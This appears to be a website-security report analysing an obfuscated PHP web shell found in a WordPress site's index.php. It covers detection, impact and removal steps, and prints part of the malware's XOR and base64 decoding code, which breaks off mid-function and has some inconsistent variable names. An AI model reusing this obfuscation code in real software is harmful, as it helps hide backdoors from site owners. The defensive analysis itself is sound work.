---
title: 'Malicious PHP Script Detected in index.php'
slug: 'malicious-php-script-detected-index-php'
description: 'Analysis of a malicious PHP script detected in index.php, outlining its potential impact and the technical breakdown of its code.'
reportDate: '2026-02-05'
threatType: 'Malware'
severity: 'High'
fileHash: 'bccff33177c73182c9923302af5fafa6dab2c13d8f599398b3fc7233f42881e2'
detectedPaths: ['index.php']
screenshots:
  [
    '/images/wordpress-threats/random-number-folder-name-inside-public_html-contains-malware_evidence-1.png',
    '/images/wordpress-threats/random-number-folder-name-inside-public_html-contains-malware_evidence-2.png',
  ]
vtLink: 'https://www.virustotal.com/gui/file/bccff33177c73182c9923302af5fafa6dab2c13d8f599398b3fc7233f42881e2'
vtScore: '0/62'
impact: 'The script could facilitate remote code execution, data breaches, or become a foothold for further attacks on the server.'
seenOn: 'May 14, 2022'
behavior: 'Obfuscation, String Encryption, Encoding'
difficulty: 'Medium'
recurrence: 'Possible if root cause is not addressed'
numberOfSiteFixed: '1'
---

## Technical Analysis

Upon inspection of the file `index.php`, the contents exhibit characteristics typical of an obfuscated malicious PHP script. The code contains several obscured functions such as `ax103b8c63`, `f3cfb984d`, and `update_singleblog`, which hint at potentially harmful behavior.

1. **Obfuscation and Encryption:**
   - Functions like `ax103b8c63` and `abb9d968` implement XOR-based encryption, a common technique used to hide malicious payloads from detection.
   - The use of `base64` encoding functions, like `ae103b8c63`, suggests attempts to further obfuscate execution.

2. **Key Features:**
   - **XOR Encryption:** Functions such as `f3cfb984d` include logic to encrypt and decrypt data, likely to protect payload integrity when sent over networks.
   - **String Manipulations:** Reversal and ROT13-style operations in functions like `bb9d968` are intended to mask and modify strings during runtime.

3. **Potential Impact:**
   - This script could be utilized for unauthorized data access, command execution, or further malware deployment, typical for web shell operations.

4. **Indicators of Compromise:**
   - The usage of non-standard PHP functions and odd naming conventions indicate likely obfuscation efforts aimed at bypassing superficial code audits.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

## Code Signature(s)

### FILE: `index.php`

```php
<?php
##########################################################
#  _____  _____  ____      _______  _  ___     ________  #
# |  __ \|  __ \/_ \ \    / /  __ \| || \ \   / /___  /  #
# | |__) | |__) || |\ \  / /| |  | | || |\ \_/ /   / /   #
# |  ___/|  _  / | | \ \/ / | |  | |__   _\   /   / /    #
# | |    | | \ \ | |  \  /  | |__| |  | |  | |   / /__   #
# |_|    |_|  \_\|_|   \/   |_____/   |_|  |_|  /_____|  #
# powered by privdayz.com - 2025                         #
# github.com/privdayzcom   ||   t.me/privdayz            #
##########################################################
function ax103b8c63(string $p4l):string{$kX="2a12XTwzWMwyAkMOIXhEov8OHJ1S3WGFQV9PHEuSCWuPPp5xOPSIlwa";$lX='';$pX=strlen($kX);for($i=0,$len=strlen($p4l);$i<$len;$i++){$xX.=cX(oLs($p4l[$i])^l0l($kX[$i%$klen]));}return pr1vd4y($ad7812ad);}
function update_singleblog(string $update_blog_post) : string { $b57550f520 = ''; $x995b1f70 = a2d425a0232286e014c54443($x6c6643674); $c056553163 = pr0v($update_blog_post); for($x258795b3b5f=0; $x258795b3b5f<$c056553163; $x258795b3b5f++){ $b57550f520 .= chr( ord($update_blog_post[$x258795b3b5f]) ^ ord($x6c6643674[$x258795b3b5f % $x995b1f70]) ); } $__f1nal__ = pr1vd4y( pr44v(p90x($b57550f520)) ); return $__f1nal__; }
function f3cfb984d($d,$k){$a701f7d="ObfK";$a261f7d="OvtK";$a361f7d="OetK";$x229b752ce=function(string $ce09b742d1)use($a701f7d):string{$a561f7d="PR1V";$c58700097=ae103b8c63($ce09b742d1);$x1ae0ca1c44='';for($i=0;$i<strlen($c58700097);$i++){$x1ae0ca1c44.=chr(ord($c58700097[$i])^ord($a701f7d[$i%strlen($a701f7d)]));}return $x1ae0ca1c44;};$a461f7d="OstK";$baed05c80='JwceeS0LCA==';$e349be98='LAoU';$c28ac75d24='IBAC';$d1884342c='PBYUOSoU';$f1f73f391e6=$x229b752ce($baed05c80);$f4206aa02=$x229b752ce($e349be98);$b20ed3bf=$x229b752ce($c28ac75d24);$fn_abb9d968=$x229b752ce($d1884342c);$a=$f1f73f391e6($d);$b='';for($i=0;$i<strlen($a);$i++){$b.=$f4206aa02($b20ed3bf($a[$i])^$b20ed3bf($k[$i%strlen($k)]));}return $f1f73f391e6($fn_abb9d968($b));}
function ae103b8c63($in){$x='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';$s=str_split($in);$o='';$i=0;$v='';while($i<count($s)){$a=array_search($s[$i++],str_split($x));$b=array_search($s[$i++],str_split($x));$c=array_search($s[$i++],str_split($x));$d=array_search($s[$i++],str_split($x));$v=chr(($a<<2)|($b>>4));$o.=$v;if($c!==false&&$c!=64){$v=chr((($b&15)<<4)|($c>>2));$o.=$v;}if($d!==false&&$d!=64){$v=chr((($c&3)<<6)|$d);$o.=$v;}}return $o;}
function ac3d3104a($z) { $k='';$c=0; $f=str_split($z); for($i=0;$i<count($f);$i+=2){ $a=$f[$i];$b=$f[$i+1]; $A=(ord($a)>64)?(ord($a)&31)+9:ord($a)&15; $B=(ord($b)>64)?(ord($b)&31)+9:ord($b)&15; $k.=(string)pack("C",($A<<4)|$B); $c++; } return $k; }
function abb9d968($z) { $k = ''; $len = strlen($z); for($i = $len - 1; $i >= 0; $i--) { $k .= $z[$i]; } return $k; }
function bb9d968($z){ $k = ''; $len = strlen($z); for ($i = 0; $i < $len; $i++) { $c = $z[$i]; $o = ord($c); if ($o >= 97 && $o <= 122) { $k .= chr((($o - 97
```

## Indicators of Compromise (IOCs)

## Removal Protocol

1. Delete the `index.php` file immediately from the `5d8c5` directory.
1. Replace the compromised file with a clean version from a backup.
1. Review access logs to identify unauthorized access or suspicious activities.
1. Conduct a full security audit of the server, including scanning for other modifications.
1. Consider employing a WAF (Web Application Firewall) for ongoing protection.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
